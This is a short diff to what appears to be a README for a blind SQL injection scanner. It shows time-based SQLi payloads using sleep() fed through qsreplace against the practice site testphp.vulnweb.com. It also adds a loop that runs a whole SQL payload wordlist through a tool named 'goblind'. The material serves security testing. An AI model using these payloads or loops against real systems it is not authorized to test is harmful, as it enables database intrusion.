@@ -56,6 +56,11 @@ OR
     `echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5`
     <br>
     `echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(10)))v)" | jeeves --payload-time 10`
+    
+    TIP:
+    
+    Using with sql payloads wordlist
+    `cat sql_wordlist.txt | while read payload;do echo http://testphp.vulnweb.com/artists.php?artist= | qsreplace $payload | goblind --payload-time 5;done`
 
 <br>
 
